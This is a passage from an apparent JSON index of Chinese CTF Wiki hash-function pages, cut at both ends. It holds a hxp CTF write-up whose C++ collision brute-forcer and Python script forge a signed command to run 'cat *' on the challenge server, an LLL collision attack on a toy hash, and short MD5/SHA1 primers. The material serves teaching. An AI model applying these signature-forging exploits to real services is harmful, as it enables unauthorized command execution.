\u6b64\u7c7b\u547d\u4ee4\u3002\u4f46\u662f\u95ee\u9898\u662f\u6211\u4eec\u9700\u8981\u975e\u5e38\u5927\u91cf ip \u6765\u63d0\u4f9b\u78b0\u649e\u7684\u6570\u636e\u3002</p> <p>\u53ef\u4ee5\u53d1\u73b0\uff0cgo \u53d6 ip \u7684\u65f6\u5019\uff0c\u662f\u5148\u7528<code>net.ParseIP</code>\u89e3\u6790\u4e86 ip\uff0c\u6211\u4eec\u5728 ip \u6bcf\u4e2a\u6570\u5b57\u524d\u9762\u52a0 0 \uff0c\u89e3\u6790\u540e\u8fd8\u662f\u539f\u6765\u7684 ip \u7ed3\u679c\uff0c\u6bcf\u4e2a\u6570\u5b57\u6700\u591a\u6dfb\u52a0 256 \u4e2a 0\uff0c\u56db\u4e2a\u6570\u5b57\u5c31\u5df2\u7ecf\u4ea7\u751f\u4e86 <code>2^32</code>\u79cd\u4e0d\u540c\u7684\u7ec4\u5408\uff0c\u8db3\u4ee5\u78b0\u649e\u51fa <code>ls -l</code>\u4e0e <code>cat *</code>\u4e4b\u95f4\u7684\u51b2\u7a81\u3002</p> <p>\u5b98\u65b9\u9898\u89e3\u7684 c++ \u78b0\u649e\u811a\u672c\u6211\u672c\u5730\u7f16\u8bd1\u7684\u6709\u70b9\u95ee\u9898\uff0c\u52a0\u4e86\u4e00\u4e9b\u5f15\u5165\u7684\u5934\u6587\u4ef6\uff1a</p> <pre><code>// g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt\n\n#include &lt;cassert&gt;\n#include &lt;iomanip&gt;\n#include &lt;string&gt;\n#include &lt;sstream&gt;\n#include &lt;iostream&gt;\n#include &lt;functional&gt;\n#include &lt;random&gt;\n#include &lt;unordered_map&gt;\n#include &lt;algorithm&gt;\n#include &lt;thread&gt;\n#include &lt;atomic&gt;\n#include &lt;mutex&gt;\n#include &lt;array&gt;\n#include &lt;openssl/sha.h&gt;\n\nconst unsigned num_threads = std::thread::hardware_concurrency();\n\n\n\nstatic std::string hash(std::string const&amp; s)\n{\nSHA_CTX ctx;\nif (!SHA1_Init(&amp;ctx)) throw;\nif (!SHA1_Update(&amp;ctx, s.data(), s.length())) throw;\nstd::string d(SHA_DIGEST_LENGTH, 0);\nif (!SHA1_Final((uint8_t *) &amp;d[0], &amp;ctx)) throw;\nreturn d;\n}\n\nstatic std::u32string kapot(std::string const&amp; s)\n{\nstd::u32string r(s.size(), 0);\nsize_t o = 0;\n\nfor (size_t i = 0; i &lt; s.length(); ) {\n\nauto T = [](uint8_t c) {\nreturn (c &lt; 0x80)         ? 1   /* ASCII */\n: (c &amp; 0xc0) == 0x80 ? 0   /* continuation */\n: (c &amp; 0xe0) == 0xc0 ? 2   /* 2-byte chunk */\n: (c &amp; 0xf0) == 0xe0 ? 3   /* 3-byte chunk */\n: (c &amp; 0xf8) == 0xf0 ? 4   /* 4-byte chunk */\n: -1;\n};\n\nuint32_t c = s[i++];\nauto cont = [&amp;]() { c = (c &lt;&lt; 6) | (s[i++] &amp; 0x3f); };\n\nswitch (T(c)) {\n\ncase -1:\ncase  0:\ninvalid: c = 0xfffd; /* fall through */\n\ncase  1:\nvalid:   r[o++] = c; break;\n\ncase  2:\nif (c &amp;= 0x1f, i+0 &gt;= s.size() || T(s[i+0]))\ngoto invalid;\ngoto one;\n\ncase  3:\nif (c &amp;= 0x1f, i+1 &gt;= s.size() || T(s[i+0]) || T(s[i+1]))\ngoto invalid;\ngoto two;\n\ncase  4:\nif (c &amp;= 0x1f, i+2 &gt;= s.size() || T(s[i+0]) || T(s[i+1]) || T(s[i+2]))\ngoto invalid;\ncont();\ntwo:     cont();\none:     cont();\ngoto valid;\n\n}\n\n}\n\nr.resize(o);\n\nreturn r;\n}\n\nstd::atomic&lt;uint64_t&gt; hcount = 0, kcount = 0;\ntypedef std::unordered_map&lt;std::u32string, std::string&gt; tab_t;\ntab_t tab0, tab1;\nstd::mutex mtx;\n\nstd::array&lt;uint8_t,4&gt; ip;\nstd::string cmd0, cmd1;\n\nclass stuffer_t\n{\nprivate:\nstd::array&lt;size_t,4&gt; cnts;\nsize_t step;\nstd::string cmd;\npublic:\nstuffer_t(size_t t, size_t s, std::string c) : cnts{t}, step(s), cmd(c) {}\nstd::string operator()()\n{\n//XXX this is by far not the most efficient way of doing this, but yeah\nif (++cnts[3] &gt;= cnts[0]) {\ncnts[3] = 0;\nif (++cnts[2] &gt;= cnts[0]) {\ncnts[2] = 0;\nif (++cnts[1] &gt;= cnts[0]) {\ncnts[1] = 0;\ncnts[0] += step;\n}\n}\n}\nstd::stringstream o;\nfor (size_t i = 0; i &lt; 4; ++i)\no &lt;&lt; (i ? \".\" : \"\")\n&lt;&lt; std::string(cnts[i], '0')\n&lt;&lt; (unsigned) ip[i];\no &lt;&lt; \"|\" &lt;&lt; cmd;\nreturn o.str();\n}\n};\n\nvoid go(size_t tid)\n{\n//XXX tid stuff is a hack, but YOLO\n\nbool one = tid &amp; 1;\n\nstuffer_t next(tid &gt;&gt; 1, (num_threads + 1) &gt;&gt; 1, one ? cmd1 : cmd0);\n\ntab_t&amp; mytab = one ? tab1 : tab0;\ntab_t&amp; thtab = one ? tab0 : tab1;\n\nuint64_t myhcount = 0, mykcount = 0;\n\nwhile (1) {\n\nstd::string r = next();\n\n{\n\n++myhcount;\n\nauto h = hash(r);\nif ((h.size()+3)/4 &lt; (size_t) std::count_if(h.begin(), h.end(),\n[](unsigned char c) { return c &lt; 0x80; }))\ncontinue;\n\n++mykcount;\n\nauto k = kapot(h);\nif (k.size() &gt; 3 + (size_t) std::count(k.begin(), k.end(), 0xfffd))\ncontinue;\n\nstd::lock_guard&lt;std::mutex&gt; lck(mtx);\n\nhcount += myhcount, myhcount = 0;\nkcount += mykcount, mykcount = 0;\n\nif (thtab.find(k) != thtab.end()) {\n\nmytab[k] = r;\n\nstd::cerr &lt;&lt; \"\\r\\x1b[K\"\n&lt;&lt; \"\\x1b[32m\";\nstd::cout &lt;&lt; tab0[k] &lt;&lt; std::endl\n&lt;&lt; tab1[k] &lt;&lt; std::endl;\nstd::cerr &lt;&lt; \"\\x1b[0m\";\n\nstd::cerr &lt;&lt; std::hex;\nbool first = true;\nfor (uint32_t c: k)\nstd::cerr &lt;&lt; (first ? first = false, \"\" : \" \") &lt;&lt; c;\nstd::cerr &lt;&lt; std::endl;\n\nstd::cerr &lt;&lt; std::dec &lt;&lt; \"hash count:  \\x1b[35m\" &lt;&lt; hcount &lt;&lt; \"\\x1b[0m\";\n{\nstd::stringstream s;\ns &lt;&lt; std::fixed &lt;&lt; std::setprecision(2) &lt;&lt; log(hcount|1)/log(2);\nstd::cerr &lt;&lt; \" (2^\\x1b[35m\" &lt;&lt; std::setw(5) &lt;&lt; s.str() &lt;&lt; \"\\x1b[0m\" &lt;&lt; \")\" &lt;&lt; std::endl;\n}\nstd::cerr &lt;&lt; \"kapot count: \" &lt;&lt; \"\\x1b[35m\" &lt;&lt; kcount &lt;&lt; \"\\x1b[0m\";\n{\nstd::stringstream s;\ns &lt;&lt; std::fixed &lt;&lt; std::setprecision(2) &lt;&lt; log(kcount|1)/log(2);\nstd::cerr &lt;&lt; \" (2^\\x1b[35m\" &lt;&lt; std::setw(5) &lt;&lt; s.str() &lt;&lt; \"\\x1b[0m)\" &lt;&lt; std::endl;\n}\nstd::cerr &lt;&lt; \"table sizes: \\x1b[35m\"\n&lt;&lt; tab0.size() &lt;&lt; \"\\x1b[0m \\x1b[35m\"\n&lt;&lt; tab1.size() &lt;&lt; \"\\x1b[0m\" &lt;&lt; std::endl;\n\nexit(0);\n\n}\n\nif (mytab.size() &lt; (1 &lt;&lt; 20))\nmytab[k] = r;\n\n}\n\nhcount += myhcount;\nkcount += mykcount;\n\n}\n}\n\nvoid status()\n{\nwhile (1) {\n\n{\nstd::lock_guard&lt;std::mutex&gt; lck(mtx);\n\nstd::cerr &lt;&lt; \"\\r\\x1b[K\";\nstd::cerr &lt;&lt; \"hash count: \\x1b[35m\" &lt;&lt; std::setw(12) &lt;&lt; hcount &lt;&lt; \"\\x1b[0m \";\n{\nstd::stringstream s;\ns &lt;&lt; std::fixed &lt;&lt; std::setprecision(2) &lt;&lt; log(hcount|1)/log(2);\nstd::cerr &lt;&lt; \"(2^\\x1b[35m\" &lt;&lt; std::setw(5) &lt;&lt; s.str() &lt;&lt; \"\\x1b[0m) | \";\n}\nstd::cerr &lt;&lt; \"kapot count: \\x1b[35m\" &lt;&lt; std::setw(12) &lt;&lt; kcount &lt;&lt; \"\\x1b[0m \";\n{\nstd::stringstream s;\ns &lt;&lt; std::fixed &lt;&lt; std::setprecision(2) &lt;&lt; log(kcount|1)/log(2);\nstd::cerr &lt;&lt; \"(2^\\x1b[35m\" &lt;&lt; std::setw(5) &lt;&lt; s.str() &lt;&lt; \"\\x1b[0m) | \";\n}\nstd::cerr &lt;&lt; \"tables: \\x1b[35m\"\n&lt;&lt; std::setw(9) &lt;&lt; tab0.size() &lt;&lt; \" \"\n&lt;&lt; std::setw(9) &lt;&lt; tab1.size() &lt;&lt; \"\\x1b[0m \"\n&lt;&lt; std::flush;\n}\n\nstd::this_thread::sleep_for(std::chrono::milliseconds(100));\n}\n}\n\nint main(int argc, char **argv)\n{\n\nif (argc &lt; 2) {\nstd::cerr &lt;&lt; \"\\x1b[31mneed IPv4 in argv[1]\\x1b[0m\" &lt;&lt; std::endl;\nexit(1);\n}\n{\nstd::stringstream ss(argv[1]);\nfor (auto&amp; v: ip) {\nstd::string s;\nstd::getline(ss, s, '.');\nint n = std::atoi(s.c_str());\nif (n &lt; std::numeric_limits&lt;uint8_t&gt;::min() || n &gt; std::numeric_limits&lt;uint8_t&gt;::max())\ngoto bad_ip;\nv = n;\n}\nif (!ss) {\nbad_ip:\nstd::cerr &lt;&lt; \"\\x1b[31mbad IPv4 given?\\x1b[0m\" &lt;&lt; std::endl;\nexit(2);\n}\n}\n\n\nif (argc &lt; 4) {\nstd::cerr &lt;&lt; \"\\x1b[31mneed commands in argv[2] and argv[3]\\x1b[0m\" &lt;&lt; std::endl;\nexit(2);\n}\ncmd0 = argv[2];\ncmd1 = argv[3];\n\n\nstd::thread status_thread(status);\nstd::vector&lt;std::thread&gt; ts;\nfor (unsigned i = 0; i &lt; num_threads; ++i)\nts.push_back(std::thread(go, i));\nfor (auto&amp; t: ts)\nt.join();\n\n}\n</code></pre> <p>\u7f16\u8bd1\u53ef\u80fd\u4f1a\u627e\u4e0d\u5230 <code>lcrypto</code>\uff0c\u7f16\u8bd1\u547d\u4ee4\u52a0\u4e0a lcrypto \u8def\u5f84\uff08\u6211\u672c\u5730\u662f /usr/local/opt/openssl/lib\uff09</p> <pre><code>g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt -L/usr/local/opt/openssl/lib\n</code></pre> <p>\u4e0e go \u4ea4\u4e92\u7684\u811a\u672c\uff1a</p> <pre><code>#!/usr/bin/env python3\nimport sys, requests, subprocess\n\nbenign_cmd = 'ls -l'\nexploit_cmd = 'cat *'\n\nip, port = sys.argv[1], sys.argv[2]\nurl = 'http://{}:{}'.format(ip, port)\n\nmy_ip = requests.get(url + '/ip').text\nprint('[+] IP: ' + my_ip)\n\no = subprocess.check_output(['./gewalt', my_ip, benign_cmd, exploit_cmd])\nprint('[+] gewalt:' + o.decode())\n\npayload = {}\nfor l in o.decode().splitlines():\n    ip, cmd = l.split('|')\n    payload['benign' if cmd == benign_cmd else 'pwn'] = ip, cmd\n\nprint(payload)\n\nsig  = requests.post(url + '/sign', data={'ip': payload['benign'][0], 'cmd': payload['benign'][1]}).text\nprint('[+] sig: ' + sig)\n\nr = requests.post(url + '/exec', data={'signature': sig[:172] + payload['pwn'][0]  + '|' + payload['pwn'][1]})\nprint(r.text)\n</code></pre> <pre><code> \u2699 \ue0b0 SaV-ls-l-aaS \ue0b0 python solve.py 127.0.0.1 60601\n[+] IP: 172.17.0.1\nfffd fffd fffd fffd fffd fffd 55 fffd fffd fffd fffd c fffd fffd fffd fffd fffd fffd fffd fffd\nhash count:  168104875 (2^27.32)\nkapot count: 3477222 (2^21.73)\ntable sizes: 8745 8856\n[+] gewalt:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l\n00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001|cat *\n\n{'pwn': (u'00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001', u'cat *'), 'benign': (u'00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001', u'ls -l')}\n[+] sig: ODxSukwtu4rHICBpzT23WGD7DCJNawhA0DUN/tcyv1AgwNmS8OPUnO5FnBBDgiaVx5OTYd4OjH8LVbKiXUBUBuFx1OHDgKBKG5umkKMLt+350SlgMWY5qWny9tPIU3I+X0A9FcADCBCi6f0PkXfc0CSCZXuFu9rAKnVGsbmaUwY=00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l\nhxp{FLAG}\n</code></pre> <p>\u53c2\u8003\uff1a</p> <ul> <li>https://ctftime.org/writeup/17966</li> </ul>"},{"location":"crypto/hash/fnv/","title":"Fowler\u2013Noll\u2013Vo hash function","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5177\u4f53\u8bf7\u53c2\u89c1 https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function\u3002</p>"},{"location":"crypto/hash/fnv/#2018-hashcoll","title":"2018 \u7f51\u9f0e\u676f hashcoll","text":"<p>\u5176\u5b9e\u8fd9\u9053\u9898\u662f\u4ece NSU Crypto \u6284\u8fc7\u6765\u7684\uff0chttps://nsucrypto.nsu.ru/archive/2017/problems_solution\uff0c\u5177\u4f53\u7684 wp \u4e4b\u524d hellman \u4e5f\u5199\u4e86\uff0chttps://gist.github.com/hellman/9bf8376cd04e7a8dd2ec7be1947261e9\u3002</p> <p>\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee</p> <pre><code>h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399\n\n# 2**168 + 355\ng = 374144419156711147060143317175368453031918731002211L\n\n\ndef shitty_hash(msg):\n    h = h0\n    msg = map(ord, msg)\n    for i in msg:\n        h = (h + i) * g\n        # This line is just to screw you up :))\n        h = h &amp; 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n\n    return h - 0xe6168647f636\n</code></pre> <p>\u9898\u76ee\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa\u4e24\u4e2a\u6d88\u606f\uff0c\u5176\u54c8\u5e0c\u503c\u76f8\u540c\u3002\u5982\u679c\u6211\u4eec\u5c06\u8be5\u51fd\u6570\u5c55\u5f00\u7684\u8bdd\uff0c\u90a3\u4e48</p> <p>hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256}</p> <p>\u5047\u8bbe\u4e24\u4e2a\u6d88\u606f\u7684 hash \u503c\u76f8\u540c\u90a3\u4e48</p> <p>h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng  \\equiv h_0g^n+y_1g^n+y_2g_{n-1}+...+y_ng\\bmod 2^{256}</p> <p>\u8fdb\u800c</p> <p>(x_1-y_1)g^{n-1}+(x_2-y_2)g^{n-2}+...+(x_n-y_n)g^0 \\equiv 0 \\bmod 2^{256}</p> <p>\u5373\u6211\u4eec\u53ea\u9700\u8981\u627e\u5230\u4e00\u4e2a n \u7ef4\u5411\u91cf z_i=x_i-y_i\uff0c\u6ee1\u8db3\u4e0a\u8ff0\u7b49\u5f0f\u5373\u53ef\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5c06\u5176\u5316\u4e3a</p> <p>z_1g^{n-1}+z_2g^{n-2}+...+z_ng^0-k*2^{256}=0</p> <p>\u5373\u627e\u5230\u4e00\u7ec4\u5411\u91cf\u6ee1\u8db3\u4e0a\u8ff0\u8fd9\u4e2a\u5f0f\u5b50\u3002\u8fd9\u53ef\u4ee5\u8ba4\u4e3a\u662f LLL Paper \u4e2d\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684\u7b80\u5355\u60c5\u51b5\uff08\u53c2\u89c1\u683c\u95ee\u9898\u90e8\u5206\uff09\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u6784\u9020\u77e9\u9635\uff0c\u5982\u4e0b</p>  A = \\left[ \\begin{matrix} 1   &amp; 0 &amp; 0     &amp; \\cdots &amp; 0 &amp; Kg^{n-1}     \\\\ 0   &amp; 1  &amp; 0    &amp; \\cdots &amp; 0 &amp; Kg^{n-2}  \\\\ 0   &amp; 0   &amp; 1   &amp; \\cdots &amp; 0 &amp; Kg^{n-3} \\\\\\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0   &amp; 0   &amp;0   &amp; \\cdots &amp; 1 &amp; K*mod     \\\\ \\end{matrix} \\right] <p>\u4e4b\u540e\u6211\u4eec\u4f7f\u7528LLL \u7b97\u6cd5\u5373\u53ef\u83b7\u5f97\u4e24\u4e2a\u4e00\u6837\u7684\u54c8\u5e0c\u503c</p> <pre><code>from sage.all import *\n\nmod = 2**256\nh0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399\n\ng = 2**168 + 355\n\n\ndef shitty_hash(msg):\n    h = h0\n    msg = map(ord, msg)\n    for i in msg:\n        h = (h + i) * g\n        # This line is just to screw you up :))\n        h = h &amp; 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n\n    return h - 0xe6168647f636\n\n\nK = 2**200\nN = 50\nbase_str = 'a' * N\nbase = map(ord, base_str)\nm = Matrix(ZZ, N + 1, N + 2)\nfor i in xrange(N + 1):\n    ge = ZZ(pow(g, N - i, mod))\n    m[i, i] = 1\n    m[i, N + 1] = ZZ(ge * K)\nm[i, N + 1] = ZZ(K * mod)\n\nml = m.LLL()\nttt = ml.rows()[0]\nprint \"result:\", ttt\nif ttt[-1] != 0:\n    print \"Zero not reached, increase K\"\n    exit()\nelse:\n    msg = []\n    for i in xrange(N):\n        msg.append(base[i] + ttt[i])\n        if not (0 &lt;= msg[i] &lt;= 255):\n            print \"Need more bytes!\"\n            quit()\n    print msg\n    other = ''.join(map(chr, msg))\n\n    print shitty_hash(base_str)\n    print shitty_hash(other)\n</code></pre> <p>\u6ce8\u610f\u4e0d\u80fd\u76f4\u63a5\u4ec5\u4ec5\u4f7f\u7528 pow(g, N - i, mod)\uff0c\u4e0d\u7136\u751f\u6210\u7684\u6570\u4f1a\u5728 mod \u5bf9\u5e94\u7684\u57df\u4e2d\uff0c\u8fd9\u771f\u662f\u4e2a\u5927\u5751\u3002</p> <p>\u5982\u4e0b</p> <pre><code>\u279c  hashcoll sage exp.sage\nresult: (15, -14, 17, 14, 6, 0, 12, 21, 8, 29, 6, -4, -9, 10, -2, -12, -6, 0, -12, 13, -28, -28, -24, -3, 6, -5, -16, 15, 17, -14, 3, -2, -16, -25, 3, -21, -27, -9, 16, 5, -1, 0, -3, -4, -4, -19, 6, 8, 0, 0, 0, 0)\n[112, 83, 114, 111, 103, 97, 109, 118, 105, 126, 103, 93, 88, 107, 95, 85, 91, 97, 85, 110, 69, 69, 73, 94, 103, 92, 81, 112, 114, 83, 100, 95, 81, 72, 100, 76, 70, 88, 113, 102, 96, 97, 94, 93, 93, 78, 103, 105, 97, 97]\n106025341237231370726407656306665079105509255639964756437758376184556498283725\n106025341237231370726407656306665079105509255639964756437758376184556498283725\n</code></pre> <p>\u5373\u6210\u529f\u3002</p>"},{"location":"crypto/hash/introduction/","title":"\u54c8\u5e0c\u51fd\u6570","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\u628a\u6d88\u606f\u6216\u6570\u636e\u538b\u7f29\u6210\u6458\u8981\uff0c\u4f7f\u5f97\u6570\u636e\u91cf\u53d8\u5c0f\u3002\u5176\u4e00\u822c\u6a21\u578b\u5982\u4e0b</p> <p></p> <p>\u663e\u7136\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2ahash\u503c\uff0c\u7406\u8bba\u4e0a\u5b58\u5728\u82e5\u5e72\u4e2a\u6d88\u606f\u4e0e\u4e4b\u5bf9\u5e94\uff0c\u5373\u78b0\u649e\u3002</p> <p>\u54c8\u5e0c\u51fd\u6570\u7684\u57fa\u672c\u9700\u6c42\u5982\u4e0b</p> \u9700\u6c42 \u63cf\u8ff0 \u8f93\u5165\u957f\u5ea6\u53ef\u53d8 hash\u51fd\u6570\u53ef\u4ee5\u5e94\u7528\u4e8e\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e \u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a hash\u51fd\u6570\u7684\u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a \u6548\u7387 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606f x\uff0c\u8ba1\u7b97 H(x) \u5f88\u5bb9\u6613 \u5355\u5411\u6027 \u5bf9\u4e8e\u4efb\u610f\u54c8\u5e0c\u503ch\uff0c\u60f3\u8981\u627e\u5230\u6ee1\u8db3H(x)=h \u7684x\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f31\u78b0\u649e\u6027 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606fx\uff0c\u627e\u5230\u6ee1\u8db3\u53e6\u4e00\u6d88\u606fy\uff0c\u6ee1\u8db3H(x)=H(y) \uff0c\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f3a\u78b0\u649e\u6027 \u627e\u5230\u4efb\u610f\u4e00\u5bf9\u6ee1\u8db3 H(x)=H(y) \u7684\u6d88\u606fx\u548cy\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u4f2a\u968f\u673a\u6027 \u54c8\u5e0c\u51fd\u6570\u7684\u8f93\u51fa\u6ee1\u8db3\u4f2a\u968f\u673a\u6027\u6d4b\u8bd5\u6807\u51c6\u3002 <p>\u6563\u5217\u503c\u7684\u76ee\u7684\u5982\u4e0b</p> <ul> <li>\u786e\u4fdd\u6d88\u606f\u7684\u5b8c\u6574\u6027\uff0c\u5373\u786e\u4fdd\u6536\u5230\u7684\u6570\u636e\u786e\u5b9e\u548c\u53d1\u9001\u65f6\u7684\u4e00\u6837\uff08\u5373\u6ca1\u6709\u4fee\u6539\u3001\u63d2\u5165\u3001\u5220\u9664\u6216\u91cd\u653e\uff09\uff0c\u9632\u6b62\u4e2d\u95f4\u4eba\u7be1\u6539\u3002</li> <li>\u5197\u4f59\u6821\u9a8c</li> <li>\u5355\u5411\u53e3\u4ee4\u6587\u4ef6\uff0c\u6bd4\u5982linux\u7cfb\u7edf\u7684\u5bc6\u7801</li> <li>\u5165\u4fb5\u68c0\u6d4b\u548c\u75c5\u6bd2\u68c0\u6d4b\u4e2d\u7684\u7279\u5f81\u7801\u68c0\u6d4b</li> </ul> <p>\u76ee\u524d\u7684Hash\u51fd\u6570\u4e3b\u8981\u6709MD5\uff0cSHA1\uff0cSHA256\uff0cSHA512\u3002\u76ee\u524d\u7684\u5927\u591a\u6570hash\u51fd\u6570\u90fd\u662f\u8fed\u4ee3\u6027\u7684\uff0c\u5373\u4f7f\u7528\u540c\u4e00\u4e2ahash\u51fd\u6570\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u8fdb\u884c\u591a\u6b21\u8fed\u4ee3\u8fd0\u7b97\u3002</p> \u7b97\u6cd5\u7c7b\u578b \u8f93\u51fa Hash \u503c\u957f\u5ea6 MD5 128 bit / 256 bit SHA1 160 bit SHA256 256 bit SHA512 512 bit"},{"location":"crypto/hash/md5/","title":"MD5","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/hash/md5/#_1","title":"\u57fa\u672c\u63cf\u8ff0","text":"<p>MD5\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b</p> <ul> <li>\u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c512\u6bd4\u7279\u957f\u7684\u5206\u7ec4\u3002</li> <li>\u8f93\u51fa\uff1a128\u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002</li> </ul> <p>\u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002</p> <p>\u6b64\u5916\uff0c\u6709\u65f6\u5019\u6211\u4eec\u83b7\u5f97\u5230\u7684md5\u662f16\u4f4d\u7684\uff0c\u5176\u5b9e\u90a316\u4f4d\u662f32\u4f4dmd5\u7684\u957f\u5ea6\uff0c\u662f\u4ece32\u4f4dmd5\u503c\u6765\u7684\u3002\u662f\u5c0632\u4f4dmd5\u53bb\u6389\u524d\u516b\u4f4d\uff0c\u53bb\u6389\u540e\u516b\u4f4d\u5f97\u5230\u7684\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662fMD5\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u56db\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3aMD5\u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662fMD5\u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002</p> <pre><code>0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476\n</code></pre>"},{"location":"crypto/hash/md5/#_2","title":"\u7834\u89e3","text":"<p>\u76ee\u524d\u53ef\u4ee5\u8bf4md5\u5df2\u7ecf\u57fa\u672c\u88ab\u653b\u7834\u4e86\uff0c\u4e00\u822c\u7684MD5\u7684\u78b0\u649e\u90fd\u53ef\u4ee5\u5728\u5982\u4e0b\u7f51\u4e0a\u83b7\u53d6\u5230</p> <ul> <li>http://www.cmd5.com/</li> <li>http://www.ttmd5.com/</li> <li>http://pmd5.com/</li> <li>https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip (\u751f\u6210\u6307\u5b9a\u524d\u7f00\u7684md5\u78b0\u649e)</li> </ul>"},{"location":"crypto/hash/md5/#_3","title":"\u9898\u76ee","text":"<ul> <li>CFF 2016 \u597d\u591a\u76d0</li> <li>JarvisOJ \u597d\u591a\u76d0</li> </ul>"},{"location":"crypto/hash/sha1/","title":"SHA1","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/hash/sha1/#_1","title":"\u57fa\u672c\u63cf\u8ff0","text":"<p>SHA1\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b</p> <ul> <li>\u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c\u5206\u4e3a 512 \u6bd4\u7279\u957f\u7684\u5206\u7ec4\u3002\u9996\u5148\u5728\u6d88\u606f\u53f3\u4fa7\u8865\u6bd4\u7279 1\uff0c\u7136\u540e\u518d\u8865\u82e5\u5e72\u4e2a\u6bd4\u7279 0\uff0c\u76f4\u5230\u6d88\u606f\u7684\u6bd4\u7279\u957f\u5ea6\u6ee1\u8db3\u5bf9 512 \u53d6\u6a21\u540e\u4f59\u6570\u662f 448\uff0c\u4f7f\u5176\u4e0e 448 \u6a21 512 \u540c\u4f59\u3002</li> <li>\u8f93\u51fa\uff1a160 \u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002</li> </ul> <p>\u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662f SHA1 \u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u4e94\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3a SHA1 \u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662f SHA1 